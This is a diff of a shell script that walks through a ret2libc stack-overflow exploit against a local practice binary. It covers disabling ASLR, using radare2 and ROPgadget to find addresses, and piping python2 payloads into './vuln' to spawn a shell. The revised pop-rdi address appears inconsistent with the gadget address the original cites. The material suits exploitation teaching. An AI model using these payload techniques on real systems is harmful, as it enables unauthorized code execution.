@@ -1,64 +1,104 @@
 #!/bin/sh
 
-## non-executable stack so will have to jump to libc
-## first need to find address of system
+BLUE="\033[1;34m"
+NEUT="\033[0m"
 
-## r2 -d vuln
+printf "$BLUE
+Remember to turn off aslr
+$NEUT
+../../aslr.sh off"
+read
+../../aslr.sh off
 
-## [0x7f8794b8d090]> dcu entry0
-## [0x00401050]> e search.in = dbg.maps
-## [0x00401050]> dmi libc system
+printf "$BLUE
+Non-executable stack (NX) so will have to jump to libc
+First need to find address of system and the string '/bin/sh'
+I will simulate the process using radare2 but you can try do it yourself
+And you will need to to find the correct addresses
+$NEUT
+r2 -A -d vuln"
+read
 
-# nth  paddr      vaddr          bind type size lib name
-# ――――――――――――――――――――――――――――――――――――――――――――――――――――――
-# 1466 0x00049de0 0x7ffff7e12de0 WEAK FUNC 45       system
+printf "$BLUE
+Debug Continue Until entry0 (set breakpoint at entry0 then run)
+$NEUT
+[0x7f8794b8d090]> dcu entry0"
+read
 
+printf "$BLUE
+Set an option to expand the seach area
+$NEUT
+[0x00401050]> e search.in = dbg.maps"
+read
 
-## [0x00401050]> e search.from=0x7f3b383dede0
+printf "$BLUE
+Get the address of the libc function system() in the libc map
+$NEUT
+[0x00401050]> dmi libc system"
+read
 
-# 0x7ffff7f54b62 hit3_0 .cempty == 1-c/bin/shexit 0MSGVERB.
+printf "nth  paddr      vaddr          bind type size lib name
+――――――――――――――――――――――――――――――――――――――――――――――――――――――
+1466 0x00049de0 0x7ffff7e12de0 WEAK FUNC 45       system
+$BLUE
+Start the search from the address of system to make it faster
+$NEUT
+[0x00401050]> e search.from=0x7f3b383dede0"
+read
 
-## now we have the two important addresses: system and "/bin/sh"
-## but still have to get the string in rdi
-ROPgadget --binary vuln | grep rdi # 0x0000000000401263 : pop rdi ; ret
+printf "$BLUE
+Search for the string '/bin/sh'
+$NEUT
+[0x00401050]>/ /bin/sh"
+read
 
-## so the addresses we need are:
-# POPRDI : 'c\x12@\x00\x00\x00\x00\x00'
-# BINSH  : 'bK\xf5\xf7\xff\x7f\x00\x00'
-# SYSTEM : '\xe0-\xe1\xf7\xff\x7f\x00\x00'
+printf "0x7ffff7f54b62 hit3_0 .cempty == 1-c/bin/shexit 0MSGVERB.
+$BLUE
+Now we have the two important addresses: system and '/bin/sh'
+But still have to pass the string '/bin/sh' to the function system
+We need to get it into the first argument register: rdi
+We can use another tool included with pwnlib
+$NEUT
+ROPgadget --binary vuln | grep rdi"
+read
+ROPgadget --binary vuln | grep rdi
 
+printf "$BLUE
+So the addresses we need (will be different for you) are:
+POPRDI : 's\\\x12@\\\x00\\\x00\\\x00\\\x00\\\x00' 
+BINSH  : 'bK\\\xf5\\\xf7\\\xff\\\x7f\\\x00\\\x00'
+SYSTEM : '\\\xe0-\\\xe1\\\xf7\\\xff\\\x7f\\\x00\\\x00'
+$NEUT
+python2 -c 'print('\\\x90'*120 +
+'s\\\x12@\\\x00\\\x00\\\x00\\\x00\\\x00' +
+'bK\\\xf5\\\xf7\\\xff\\\x7f\\\x00\\\x00' +
+'\\\xe0-\\\xe1\\\xf7\\\xff\\\x7f\\\x00\\\x00')' | ./vuln"
+read
 python2 -c 'print("\x90"*120 +
-"c\x12@\x00\x00\x00\x00\x00" +
+"s\x12@\x00\x00\x00\x00\x00" +
 "bK\xf5\xf7\xff\x7f\x00\x00" +
 "\xe0-\xe1\xf7\xff\x7f\x00\x00")' | ./vuln   # segmentation fault
 
+
+printf "$BLUE
+And again, use cat to hold open stdin and get the shell:
+$NEUT
+(python2 -c 'print('\\\x90'*120 +
+'s\\\x12@\\\x00\\\x00\\\x00\\\x00\\\x00' +
+'bK\\\xf5\\\xf7\\\xff\\\x7f\\\x00\\\x00' +
+'\\\xe0-\\\xe1\\\xf7\\\xff\\\x7f\\\x00\\\x00')'; cat) | ./vuln"
+read
 (python2 -c 'print("\x90"*120 +
-"c\x12@\x00\x00\x00\x00\x00" +
+"s\x12@\x00\x00\x00\x00\x00" +
 "bK\xf5\xf7\xff\x7f\x00\x00" +
 "\xe0-\xe1\xf7\xff\x7f\x00\x00")'; cat) | ./vuln
-# ls
-# pattern  profile.rr2  sol  vuln
-# ps
-#     PID TTY          TIME CMD
-#    4088 pts/1    00:00:00 zsh
-#    7791 pts/1    00:00:00 cat
-#    7793 pts/1    00:00:00 vuln
-#    7794 pts/1    00:00:00 sh
-#    7823 pts/1    00:00:00 ps
 
-# done! :)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+printf "$BLUE
+commands used:
+dcu entry0
+e search.in = dbg.maps
+dmi libc system
+e search.from= ???
+/ /bin/sh
+"
 
